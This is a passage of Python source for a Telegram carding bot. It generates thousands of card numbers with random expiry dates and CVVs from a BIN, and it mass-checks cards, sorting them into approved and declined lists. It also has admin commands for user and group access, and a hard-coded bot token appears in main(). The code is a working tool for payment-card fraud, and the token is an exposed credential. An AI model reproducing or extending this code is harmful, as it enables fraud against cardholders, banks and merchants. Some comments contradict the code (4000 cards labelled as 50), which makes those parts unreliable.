                result_message += f"\n...𝗮𝗻𝗱 {len(approved_cards)-10} 𝗺𝗼𝗿𝗲"
        
        if declined_cards:
            result_message += "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            result_message += "💳 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n"
            result_message += "\n".join(declined_cards[:10])  # Show first 10
            if len(declined_cards) > 10:
                result_message += f"\n...𝗮𝗻𝗱 {len(declined_cards)-10} 𝗺𝗼𝗿𝗲"
        
        result_message += f"\n\n{create_footer(BOT_NAME)}"
        
        await progress_msg.delete()
        await update.message.reply_text(result_message)

    except Exception as e:
        logging.error(f"Mass check error: {e}")
        await update.message.reply_text(f"⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

async def gen(update: Update, context: CallbackContext):
    if not await check_user_access(update):
        return

    start_time = time.time()

    if len(context.args) != 1:
        await update.message.reply_text("❌ Use: /gen <BIN>\nExample: /gen 557920915018")
        return

    bin_input = context.args[0]
    if len(bin_input) < 6:
        await update.message.reply_text("❌ Invalid BIN. Must be at least 6 digits.")
        return

    processing_msg = await send_processing_message(
        update,
        f"🌀 Generating cards for BIN: {bin_input}"
    )

    cards = []
    for _ in range(4000):  # Generate 50 cards
        cc = generate_random_cc(bin_input)
        mes = f"{random.randint(1,12):02}"
        ano = str(random.randint(2025, 2032))
        cvv = str(random.randint(100, 999))
        cards.append(f"{cc}|{mes}|{ano}|{cvv}")

    bin_info = get_bin_info(bin_input)
    bank = bin_info.get("bank", "UNKNOWN")
    country = bin_info.get("country", "UNKNOWN").upper()
    level = bin_info.get("level", "STANDARD")
    vendor = bin_info.get("vendor", "")
    card_type = vendor or get_card_type(bin_input)
    issuer = get_card_issuer(bin_input)

    flags = {
        "UNITED STATES": "🇺🇸", "INDIA": "🇮🇳", "CANADA": "🇨🇦",
        "UNITED KINGDOM": "🇬🇧", "AUSTRALIA": "🇦🇺", "MEXICO": "🇲🇽"
    }
    flag = flags.get(country, "🌍")

    checker = update.effective_user.full_name
    elapsed = round(time.time() - start_time, 2)

    cards_str = '\n'.join(cards)
    context.user_data["last_generated"] = cards_str

    header = create_header('GENERATED CARDS (50)')
    footer = create_footer(BOT_NAME)
    msg = (
        f"{header}\n\n"
        f"BIN: {bin_input}\n"
        f"Bank: {bank}\n"
        f"Country: {country} {flag}\n"
        f"Type: {card_type} • {issuer} • {level}\n\n"
        f"{cards_str}\n\n"
        f"Time: {elapsed} Seconds\n"
        f"Generated By: {checker}\n"
        f"Bot By: {OWNER_NAME}\n"
        f"{footer}"
    )

    keyboard = [
        [InlineKeyboardButton("📋 Copy All", callback_data="copy_gen_cards")],
        [InlineKeyboardButton("✅ Mass Check", callback_data="mass_check_gen")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await processing_msg.delete()
    await update.message.reply_text(msg, reply_markup=reply_markup)

async def bin_gen(update: Update, context: CallbackContext):
    if not await check_user_access(update):
        return

    if len(context.args) != 1 or len(context.args[0]) < 6:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗕𝗜𝗡. 𝗨𝘀𝗲: /bin 454951")
        return

    bin_number = context.args[0]
    processing_msg = await send_processing_message(
        update,
        f"🔍 𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗕𝗜𝗡 𝗶𝗻𝗳𝗼 𝗳𝗼𝗿: {bin_number}"
    )
    
    bin_data = get_bin_info(bin_number)
    country = bin_data['country'].upper()
    
    flags = {
        "UNITED STATES": "🇺🇸", "INDIA": "🇮🇳", "CANADA": "🇨🇦",
        "UNITED KINGDOM": "🇬🇧", "AUSTRALIA": "🇦🇺"
    }
    flag = flags.get(country, "🌍")

    msg = (
        f"{create_header('𝗕𝗜𝗡 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡')}\n\n"
        f"𝗕𝗜𝗡: {bin_number}\n"
        f"𝗕𝗮𝗻𝗸: {bin_data['bank']}\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}\n"
        f"𝗧𝘆𝗽𝗲: {bin_data['type']} • {bin_data['level']}\n"
        f"𝗩𝗲𝗻𝗱𝗼𝗿: {bin_data['vendor']}\n"
        f"{create_footer(BOT_NAME)}"
    )

    await processing_msg.delete()
    await update.message.reply_text(msg)

async def addgroup(update: Update, context: CallbackContext):
    """Add a group to the approved list"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if update.effective_chat.type == "private":
        await update.message.reply_text("❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀!")
        return

    group_id = str(update.effective_chat.id)
    group_name = update.effective_chat.title

    if group_id not in group_data.get("approved_groups", []):
        group_data["approved_groups"].append(group_id)
        save_group_data()
        
        await update.message.reply_text(
            f"✅ 𝗚𝗿𝗼𝘂𝗽 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
            f"𝗚𝗿𝗼𝘂𝗽 𝗡𝗮𝗺𝗲: {group_name}\n"
            f"𝗚𝗿𝗼𝘂𝗽 𝗜𝗗: {group_id}"
        )
    else:
        await update.message.reply_text("ℹ️ 𝗧𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!")

async def removegroup(update: Update, context: CallbackContext):
    """Remove a group from the approved list"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if update.effective_chat.type == "private":
        await update.message.reply_text("❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀!")
        return

    group_id = str(update.effective_chat.id)
    group_name = update.effective_chat.title

    if group_id in group_data.get("approved_groups", []):
        group_data["approved_groups"].remove(group_id)
        save_group_data()
        
        await update.message.reply_text(
            f"✅ 𝗚𝗿𝗼𝘂𝗽 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
            f"𝗚𝗿𝗼𝘂𝗽 𝗡𝗮𝗺𝗲: {group_name}\n"
            f"𝗚𝗿𝗼𝘂𝗽 𝗜𝗗: {group_id}"
        )
    else:
        await update.message.reply_text("ℹ️ 𝗧𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗹𝗶𝘀𝘁!")

async def listgroups(update: Update, context: CallbackContext):
    """List all approved groups (admin only)"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if not group_data.get("approved_groups"):
        await update.message.reply_text("ℹ️ 𝗡𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗴𝗿𝗼𝘂𝗽𝘀.")
        return

    message = "👥 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗚𝗿𝗼𝘂𝗽𝘀:\n\n"
    for group_id in group_data["approved_groups"]:
        try:
            chat = await context.bot.get_chat(group_id)
            message += f"📌 {chat.title}\n🆔: {group_id}\n\n"
        except Exception as e:
            message += f"❌ [Deleted Group]\n🆔: {group_id}\n\n"
            continue

    await update.message.reply_text(message)

async def add_user(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if len(context.args) < 1:
        await update.message.reply_text("❌ 𝗨𝘀𝗮𝗴𝗲: /add_user <𝘂𝘀𝗲𝗿_𝗶𝗱> [𝗽𝗿𝗲𝗺𝗶𝘂𝗺]")
        return

    user_id = context.args[0]
    is_premium = len(context.args) > 1 and context.args[1].lower() == "premium"
    
    if "approved" not in user_data:
        user_data["approved"] = []
    
    if user_id not in user_data["approved"]:
        user_data["approved"].append(user_id)
    
    user_data["users"][user_id] = {
        "added_by": str(update.effective_user.id),
        "date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "premium": is_premium
    }
    
    if is_premium:
        if "premium_users" not in user_data:
            user_data["premium_users"] = []
        user_data["premium_users"].append(user_id)
    
    save_user_data()
    
    try:
        await context.bot.send_message(
            user_id,
            "🎉 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n\n"
            "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀.\n"
            "𝗧𝘆𝗽𝗲 /start 𝘁𝗼 𝘀𝗲𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀."
        )
    except Exception as e:
        logging.error(f"Error notifying user: {e}")
    
    await update.message.reply_text(f"✅ 𝗨𝘀𝗲𝗿 {user_id} 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")

async def remove_user(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if len(context.args) < 1:
        await update.message.reply_text("❌ 𝗨𝘀𝗮𝗴𝗲: /remove_user <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return

    user_id = context.args[0]
    if user_id in user_data["users"]:
        del user_data["users"][user_id]
        if "premium_users" in user_data and user_id in user_data["premium_users"]:
            user_data["premium_users"].remove(user_id)
        if "approved" in user_data and user_id in user_data["approved"]:
            user_data["approved"].remove(user_id)
        save_user_data()
        
        try:
            await context.bot.send_message(
                user_id,
                "⚠️ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱."
            )
        except Exception as e:
            logging.error(f"Error notifying user: {e}")
            
        await update.message.reply_text(f"✅ 𝗨𝘀𝗲𝗿 {user_id} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")
    else:
        await update.message.reply_text("❌ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!")

async def ban_user(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if len(context.args) < 1:
        await update.message.reply_text("❌ 𝗨𝘀𝗮𝗴𝗲: /ban_user <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return

    user_id = context.args[0]
    if "banned" not in user_data:
        user_data["banned"] = []
    
    if user_id not in user_data["banned"]:
        user_data["banned"].append(user_id)
        save_user_data()
        
        try:
            await context.bot.send_message(
                user_id,
                "🚫 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁."
            )
        except Exception as e:
            logging.error(f"Error notifying user: {e}")
            
        await update.message.reply_text(f"✅ 𝗨𝘀𝗲𝗿 {user_id} 𝗯𝗮𝗻𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")
    else:
        await update.message.reply_text("ℹ️ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗮𝗻𝗻𝗲𝗱!")

async def unban_user(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if len(context.args) < 1:
        await update.message.reply_text("❌ 𝗨𝘀𝗮𝗴𝗲: /unban_user <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return

    user_id = context.args[0]
    if "banned" in user_data and user_id in user_data["banned"]:
        user_data["banned"].remove(user_id)
        save_user_data()
        
        try:
            await context.bot.send_message(
                user_id,
                "🎉 𝗬𝗼𝘂𝗿 𝗯𝗮𝗻 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗹𝗶𝗳𝘁𝗲𝗱. 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗮𝗴𝗮𝗶𝗻."
            )
        except Exception as e:
            logging.error(f"Error notifying user: {e}")
            
        await update.message.reply_text(f"✅ 𝗨𝘀𝗲𝗿 {user_id} 𝘂𝗻𝗯𝗮𝗻𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")
    else:
        await update.message.reply_text("ℹ️ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗯𝗮𝗻𝗻𝗲𝗱!")

async def stats(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    total_users = len(user_data.get("users", {}))
    premium_users = len(user_data.get("premium_users", []))
    banned_users = len(user_data.get("banned", []))
    approved_users = len(user_data.get("approved", []))
    approved_groups = len(group_data.get("approved_groups", []))
    
    msg = (
        f"{create_header('𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦')}\n\n"
        f"𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {total_users}\n"
        f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {approved_users}\n"
        f"𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗲𝗿𝘀: {premium_users}\n"
        f"𝗕𝗮𝗻𝗻𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {banned_users}\n"
        f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗚𝗿𝗼𝘂𝗽𝘀: {approved_groups}\n"
        f"{create_footer(BOT_NAME)}"
    )
    await update.message.reply_text(msg)

async def list_users(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    if not user_data.get("users"):
        await update.message.reply_text("ℹ️ 𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗶𝗻 𝘁𝗵𝗲 𝗱𝗮𝘁𝗮𝗯𝗮𝘀𝗲.")
        return

    users_list = []
    for user_id, user_info in user_data["users"].items():
        status = "✅" if user_id in user_data.get("approved", []) else "⏳"
        premium = "💎" if user_id in user_data.get("premium_users", []) else ""
        banned = "🚫" if user_id in user_data.get("banned", []) else ""
        name = user_info.get("username", user_info.get("first_name", "Unknown"))
        users_list.append(f"{status} {premium} {banned} {name} - ID: {user_id}")

    message = "👥 𝗨𝘀𝗲𝗿 𝗟𝗶𝘀𝘁:\n\n" + "\n".join(users_list)
    
    # Split long messages into multiple parts
    max_length = 4000  # Telegram message limit
    for i in range(0, len(message), max_length):
        await update.message.reply_text(message[i:i+max_length])

async def start(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    user_name = update.effective_user.full_name
    
    # Add user to database if not exists
    if user_id not in user_data.get("users", {}):
        user_data["users"][user_id] = {
            "username": update.effective_user.username,
            "first_name": update.effective_user.first_name,
            "last_name": update.effective_user.last_name,
            "added_by": "self",
            "date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "premium": False
        }
        save_user_data()

    # Check if user is approved
    is_approved = user_id in user_data.get("approved", [])
    is_premium = user_id in user_data.get("premium_users", [])
    is_banned = user_id in user_data.get("banned", [])
    
    if is_banned:
        await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁.")
        return
    
    # Get user profile photo if available
    profile_photo = None
    try:
        photos = await update.effective_user.get_profile_photos(limit=1)
        if photos.photos:
            profile_photo = photos.photos[0][-1].file_id
    except Exception as e:
        logging.error(f"Error getting profile photo: {e}")

    # Create welcome message
    welcome_header = f"✨ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 {BOT_NAME} ✨"
    status_line = f"🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}\n"
    status_line += f"🔒 𝗦𝘁𝗮𝘁𝘂𝘀: {'✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱' if is_approved else '⏳ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴'}\n"
    status_line += f"💎 𝗣𝗿𝗲𝗺𝗶𝘂𝗺: {'✅ 𝗬𝗲𝘀' if is_premium else '❌ 𝗡𝗼'}"
    
    commands_header = "🛠 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:"
    commands_list = (
        "/chk 𝗰𝗰|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃 - 𝗖𝗵𝗲𝗰𝗸 𝘀𝗶𝗻𝗴𝗹𝗲 𝗰𝗮𝗿𝗱\n"
        "/vbv 𝗰𝗰|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃 - 𝗖𝗵𝗲𝗰𝗸 𝗩𝗕𝗩 𝘀𝘁𝗮𝘁𝘂𝘀\n"
        "/mass (𝗿𝗲𝗽𝗹𝘆) - 𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱𝘀\n"
        "/cchk (𝗿𝗲𝗽𝗹𝘆) - 𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝘄𝗶𝘁𝗵 𝗳𝘂𝗹𝗹 𝗿𝗲𝘀𝘂𝗹𝘁𝘀\n"
        "/gen 𝘅𝘅𝘅𝘅𝘅𝘅 - 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝟱𝟬 𝗰𝗮𝗿𝗱𝘀\n"
        "/bin 𝘅𝘅𝘅𝘅𝘅𝘅 - 𝗚𝗲𝘁 𝗕𝗜𝗡 𝗶𝗻𝗳𝗼"
    )
    
    footer = f"🤖 𝗕𝗼𝘁 𝗢𝘄𝗻𝗲𝗿: {OWNER_NAME}"
    
    # Format the full message
    welcome_message = (
        f"{welcome_header}\n\n"
        f"{status_line}\n\n"
        f"{commands_header}\n"
        f"{commands_list}\n\n"
        f"{footer}"
    )
    
    # Send message with or without profile photo
    if profile_photo:
        await update.message.reply_photo(
            photo=profile_photo,
            caption=welcome_message
        )
    else:
        await update.message.reply_text(welcome_message)

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    if query.data == "copy_gen_cards":
        cards = context.user_data.get("last_generated", "𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝘁𝗼 𝗰𝗼𝗽𝘆")
        await query.edit_message_text(f"📋 𝗖𝗮𝗿𝗱𝘀 𝗰𝗼𝗽𝗶𝗲𝗱 𝘁𝗼 𝗰𝗹𝗶𝗽𝗯𝗼𝗮𝗿𝗱:\n\n{cards}")
    elif query.data == "mass":
        # Get the cards from the original message
        original_message = query.message.text
        card_matches = re.findall(r'\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}', original_message)
        
        if not card_matches:
            await query.edit_message_text("❌ 𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗺𝗲𝘀𝘀𝗮𝗴𝗲!")
            return
        
        # Create a progress message
        progress_msg = await query.message.reply_text(
            f"⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(card_matches)} 𝗰𝗮𝗿𝗱𝘀..."
        )
        
        # Store cards in context for mass checking
        context.user_data["cards_to_check"] = card_matches
        await cchk(update, context)

def main():
    bot_token = "8021314826:AAE7bIBIje-eEkYHX_Qlvrkisa3oCTpusP0"
    application = Application.builder().token(bot_token).build()

    # User commands
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('chk', chk))
    application.add_handler(CommandHandler('vbv', vbv))
    application.add_handler(CommandHandler('mass', mass))
    application.add_handler(CommandHandler('cchk', cchk))  # New mass check command
    application.add_handler(CommandHandler('bin', bin_gen))
    application.add_handler(CommandHandler('gen', gen))

    # Admin commands
    application.add_handler(CommandHandler('add_user', add_user))
    application.add_handler(CommandHandler('remove_user', remove_user))
    application.add_handler(CommandHandler('ban_user', ban_user))
    application.add_handler(CommandHandler('unban_user', unban_user))
    application.add_handler(CommandHandler('stats', stats))
    application.add_handler(CommandHandler('list', list_users))
    application.add_handler(CommandHandler('addgroup', addgroup))  # New group command
    application.add_handler(CommandHandler('removegroup', removegroup))  # New group command
    application.add_handler(CommandHandler('listgroups', listgroups))  # New group command

    # Button handler
    application.add_handler(CallbackQueryHandler(button_callback))

    application.run_polling()

if __name__ == '__main__':
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    main()